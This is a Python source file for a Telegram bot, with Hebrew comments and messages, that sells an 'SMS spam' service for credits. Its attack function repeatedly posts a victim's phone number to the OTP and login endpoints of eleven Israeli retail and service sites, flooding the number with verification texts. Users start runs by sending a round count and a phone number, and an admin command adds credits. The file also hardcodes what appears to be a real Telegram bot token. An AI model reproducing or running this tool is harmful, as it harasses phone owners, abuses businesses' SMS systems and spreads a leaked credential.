import telebot
import requests
import time
from flask import Flask
from threading import Thread
import os
import uuid
from datetime import datetime, timedelta

# --- שרת Flask לשמירה על הבוט בחיים ---
app = Flask('')
@app.route('/')
def home(): return "<h1>Bot for Tzur Dvir is Online</h1>"

def keep_alive():
    t = Thread(target=lambda: app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 8080))))
    t.start()

# --- הגדרות בוט ומנהל ---
API_TOKEN = '8788411826:AAG5BMCIL_iNCfgX8kM2f5BIzN6RZtd_C30' 
ADMIN_ID = 7265913946  # ה-ID של צור דביר כפי שביקשת
bot = telebot.TeleBot(API_TOKEN)

# מסד נתונים זמני (הנתונים מתאפסים בריסטרט של Render)
user_data = {} 

def get_user(uid):
    if uid not in user_data:
        user_data[uid] = {'credits': 0, 'last_daily': None}
    return user_data[uid]

def attack(m, target, rounds):
    uid = m.from_user.id
    user = get_user(uid)
    
    # רשימת האתרים המלאה (11 מטרות)
    apis = [
        {"n": "ACE", "u": "https://www.ace.co.il/login/prelogin/stepone", "d": {"form_key": "d0FvqBYicRoR6FlO", "newaut": "1", "phone": target, "addintinalInfo": ""}, "type": "form", "ref": "https://www.ace.co.il/"},
        {"n": "Dominos", "u": "https://api.dominos.co.il/sendOtp", "d": {"phone": target}, "type": "json", "ref": "https://www.dominos.co.il/"},
        {"n": "Hoodies", "u": "https://www.hoodies.co.il/customer/ajax/post/", "d": {"form_key": "HOnq3cnFQBxVH6HZ", "bot_validation": "1", "type": "login", "telephone": target}, "type": "form", "ref": "https://www.hoodies.co.il/"},
        {"n": "Mishloha", "u": "https://www.mishloha.co.il/api/v1/auth/otp", "d": {"phone": target}, "type": "json", "ref": "https://www.mishloha.co.il/"},
        {"n": "Fox Home", "u": "https://www.foxhome.co.il/apps/dream-card/api/proxy/otp/send", "d": {"phoneNumber": target, "uuid": str(uuid.uuid4())}, "type": "json", "ref": "https://www.foxhome.co.il/"},
        {"n": "Laline", "u": "https://www.laline.co.il/apps/dream-card/api/proxy/otp/send", "d": {"phoneNumber": target, "uuid": str(uuid.uuid4())}, "type": "json", "ref": "https://www.laline.co.il/"},
        {"n": "Foot Locker", "u": "https://footlocker.co.il/apps/dream-card/api/proxy/otp/send", "d": {"phoneNumber": target, "uuid": str(uuid.uuid4())}, "type": "json", "ref": "https://footlocker.co.il/"},
        {"n": "Fox", "u": "https://fox.co.il/apps/dream-card/api/proxy/otp/send", "d": {"phoneNumber": target, "uuid": str(uuid.uuid4())}, "type": "json", "ref": "https://fox.co.il/"},
        {"n": "Walla", "u": "https://mazaltov.walla.co.il/api/v1/auth/otp", "d": {"phone": target}, "type": "json", "ref": "https://mazaltov.walla.co.il/"},
        {"n": "Be Pharm", "u": "https://www.be-pharm.co.il/api/v1/auth/otp", "d": {"phone": target}, "type": "json", "ref": "https://www.be-pharm.co.il/"},
        {"n": "Hamal", "u": "https://users-auth.hamal.co.il/auth/send-auth-code", "d": {"value": target, "type": "phone", "projectId": "1"}, "type": "json", "ref": "https://www.hamal.co.il/"}
    ]

    for r in range(int(rounds)):
        if user['credits'] <= 0:
            bot.send_message(m.chat.id, "❌ **אין לך מספיק קרדיטים!**\nלקנייה פנו לצור: @YourUsername", parse_mode="Markdown")
            break
        
        user['credits'] -= 1
        success_count = 0
        
        for site in apis:
            try:
                headers = {"User-Agent": "Mozilla/5.0", "Referer": site["ref"], "X-Requested-With": "XMLHttpRequest"}
                if site["type"] == "json":
                    res = requests.post(site["u"], json=site["d"], headers=headers, timeout=5)
                else:
                    res = requests.post(site["u"], data=site["d"], headers=headers, timeout=5)
                if res.status_code in [200, 201, 204]: success_count += 1
            except: pass
        
        bot.send_message(m.chat.id, f"⚡️ **סבב {r+1} הושלם!**\n━━━━━━━━━━━━━━\n✅ הצלחות: `{success_count}/{len(apis)}`\n💰 יתרה: `{user['credits']}`", parse_mode="Markdown")
        
        if r < int(rounds) - 1:
            time.sleep(0.5) # דיליי של חצי שנייה בין סבבים כפי שביקשת

    bot.send_message(m.chat.id, "🏁 **המשימה הסתיימה!**", parse_mode="Markdown")

# --- פקודות הבוט ---

@bot.message_handler(commands=['start'])
def start(m):
    welcome_text = (
        f"👋 **שלום {m.from_user.first_name}!**\n\n"
        "🎁 /daily - קבלת 10 קרדיטים מתנה (פעם ביום)\n"
        "💰 /me - בדיקת יתרה וה-ID שלך\n"
        "🛒 לקניית קרדיטים נוספים פנה למנהל\n\n"
        "🚀 **להפעלת ספאם שלח:** `[סבבים] [טלפון]`\n"
        "*(עלות: 1 קרדיט לסבב, דיליי 0.5 שניות)*"
    )
    bot.reply_to(m, welcome_text, parse_mode="Markdown")

@bot.message_handler(commands=['daily'])
def daily(m):
    uid = m.from_user.id
    user = get_user(uid)
    now = datetime.now()
    if user['last_daily'] and now < user['last_daily'] + timedelta(days=1):
        rem = (user['last_daily'] + timedelta(days=1)) - now
        bot.reply_to(m, f"❌ כבר לקחת היום! חזור בעוד {str(rem).split('.')[0]}")
    else:
        user['credits'] += 10
        user['last_daily'] = now
        bot.reply_to(m, "🎁 קיבלת 10 קרדיטים מתנה יומית! תהנה.")

@bot.message_handler(commands=['me'])
def me(m):
    uid = m.from_user.id
    user = get_user(uid)
    bot.reply_to(m, f"👤 ה-ID שלך: `{uid}`\n💰 יתרת קרדיטים: `{user['credits']}`", parse_mode="Markdown")

@bot.message_handler(commands=['add'])
def add(m):
    # רק צור (ADMIN_ID) יכול להשתמש בפקודה הזו
    if m.from_user.id != ADMIN_ID:
        bot.reply_to(m, "❌ פקודה זו מיועדת למנהל בלבד!")
        return
    try:
        parts = m.text.split()
        target_id = int(parts[1])
        amount = int(parts[2])
        target_user = get_user(target_id)
        target_user['credits'] += amount
        bot.reply_to(m, f"✅ נוספו {amount} קרדיטים למשתמש `{target_id}`", parse_mode="Markdown")
    except:
        bot.reply_to(m, "⚠️ שימוש נכון: `/add [ID] [כמות]`")

@bot.message_handler(func=lambda m: True)
def handle(m):
    try:
        parts = m.text.split()
        if len(parts) == 2 and parts[0].isdigit() and parts[1].isdigit():
            bot.reply_to(m, f"🚀 מפעיל סבבים על {parts[1]}...", parse_mode="Markdown")
            attack(m, parts[1], parts[0])
    except: pass

if __name__ == "__main__":
    keep_alive()
    bot.remove_webhook()
    bot.polling(none_stop=True)
